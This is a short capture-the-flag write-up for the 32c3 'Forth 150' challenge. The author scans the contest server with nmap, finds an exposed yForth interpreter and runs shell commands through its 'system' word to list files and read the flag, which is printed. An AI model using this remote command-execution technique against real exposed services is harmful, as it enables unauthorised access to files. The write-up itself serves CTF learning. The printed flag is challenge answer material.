## 32c3 CTF | Category: PWN | Challenge: Forth 150 |

Wish I had more time to play around with [32c3 CTF](https://32c3ctf.ccc.ac/) since the challenges seemed pretty awesome. Anyways, between school and other stuff I had to deal with, this was the only challenge I had the chance of solving.   It was pretty easy and straight forward.

## forth 150

**Challenge**:

> **<span style="color: #ff0000;">Connect to 136.243.194.49:1024 and get a shell.</span>**

  Let's take a closer look to the service running at port 1024.

<pre class="lang:default decode:true">sudo nmap -sV -p 1024 136.243.194.49
</pre>

  We get the result:

<pre class="lang:default decode:true">Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-29 20:37 EET
Nmap scan report for static.49.194.243.136.clients.your-server.de (136.243.194.49)
Host is up (0.057s latency).
PORT     STATE SERVICE VERSION
1024/tcp open  kdm?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port1024-TCP:V=6.40%I=7%D=12/29%Time=5682D2F6%P=x86_64-pc-linux-gnu%r(N
SF:ULL,D5,"yForth\?\x20v0\.2\x20\x20Copyright\x20\(C\)\x202012\x20\x20Luca
SF:\x20Padovani\r\nThis\x20program\x20comes\x20with\x20ABSOLUTELY\x20NO\x2
SF:0WARRANTY\.\r\nThis\x20is\x20free\x20software,\x20and\x20you\x20are\x20
SF:welcome\x20to\x20redistribute\x20it\r\nunder\x20certain\x20conditions;\
SF:x20see\x20LICENSE\x20for\x20details\.\r\n")%r(GenericLines,E5,"yForth\?
SF:\x20v0\.2\x20\x20Copyright\x20\(C\)\x202012\x20\x20Luca\x20Padovani\r\n
SF:This\x20program\x20comes\x20with\x20ABSOLUTELY\x20NO\x20WARRANTY\.\r\nT
SF:his\x20is\x20free\x20software,\x20and\x20you\x20are\x20welcome\x20to\x2
SF:0redistribute\x20it\r\nunder\x20certain\x20conditions;\x20see\x20LICENS
SF:E\x20for\x20details\.\r\nok\r\nok\r\nok\r\nok\r\n")%r(GetRequest,100,"y
SF:Forth\?\x20v0\.2\x20\x20Copyright\x20\(C\)\x202012\x20\x20Luca\x20Padov
SF:ani\r\nThis\x20program\x20comes\x20with\x20ABSOLUTELY\x20NO\x20WARRANTY
SF:\.\r\nThis\x20is\x20free\x20software,\x20and\x20you\x20are\x20welcome\x
SF:20to\x20redistribute\x20it\r\nunder\x20certain\x20conditions;\x20see\x2
SF:0LICENSE\x20for\x20details\.\r\n\[GET\]\x20error\(2\):\x20unknown\x20wo
SF:rd\.\r\nok\r\nok\r\nok\r\n")%r(HTTPOptions,104,"yForth\?\x20v0\.2\x20\x
SF:20Copyright\x20\(C\)\x202012\x20\x20Luca\x20Padovani\r\nThis\x20program
SF:\x20comes\x20with\x20ABSOLUTELY\x20NO\x20WARRANTY\.\r\nThis\x20is\x20fr
SF:ee\x20software,\x20and\x20you\x20are\x20welcome\x20to\x20redistribute\x
SF:20it\r\nunder\x20certain\x20conditions;\x20see\x20LICENSE\x20for\x20det
SF:ails\.\r\n\[OPTIONS\]\x20error\(2\):\x20unknown\x20word\.\r\nok\r\nok\r
SF:\nok\r\n")%r(RTSPRequest,104,"yForth\?\x20v0\.2\x20\x20Copyright\x20\(C
SF:\)\x202012\x20\x20Luca\x20Padovani\r\nThis\x20program\x20comes\x20with\
SF:x20ABSOLUTELY\x20NO\x20WARRANTY\.\r\nThis\x20is\x20free\x20software,\x2
SF:0and\x20you\x20are\x20welcome\x20to\x20redistribute\x20it\r\nunder\x20c
SF:ertain\x20conditions;\x20see\x20LICENSE\x20for\x20details\.\r\n\[OPTION
SF:S\]\x20error\(2\):\x20unknown\x20word\.\r\nok\r\nok\r\nok\r\n")%r(DNSVe
SF:rsionBindReq,D5,"yForth\?\x20v0\.2\x20\x20Copyright\x20\(C\)\x202012\x2
SF:0\x20Luca\x20Padovani\r\nThis\x20program\x20comes\x20with\x20ABSOLUTELY
SF:\x20NO\x20WARRANTY\.\r\nThis\x20is\x20free\x20software,\x20and\x20you\x
SF:20are\x20welcome\x20to\x20redistribute\x20it\r\nunder\x20certain\x20con
SF:ditions;\x20see\x20LICENSE\x20for\x20details\.\r\n");

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.35 seconds
</pre>

  Interesting, so it seems like there's some kind of service called **[yForth](http://dev.man-online.org/man1/yforth/)** is running, which I've never heard of before. A quick Google search reveals that this is actually a small interpreter for a programming language called [Forth](https://en.wikipedia.org/wiki/Forth_(programming_language)). Well, it's pretty obvious after this point, there should be a way to run shell commands on Forth. Let's try it out.   Let's connect to our target.

<pre class="lang:default decode:true ">nc 136.243.194.49:1024</pre>

  Run a -ls command in **Forth language** to see where we are.

<pre class="lang:default decode:true">s" ls" system</pre>

  We see a file called "flag.txt". We run a cat command

<pre class="lang:default decode:true ">s" cat flag.txt" system</pre>

Et Voila! **Flag: _32C3_a8cfc6174adcb39b8d6dc361e888f17b_** ![](http://i1.wp.com/cagin.me/wp-content/uploads/2015/12/Screenshot-from-2015-12-28-143539-e1451415164488.png)
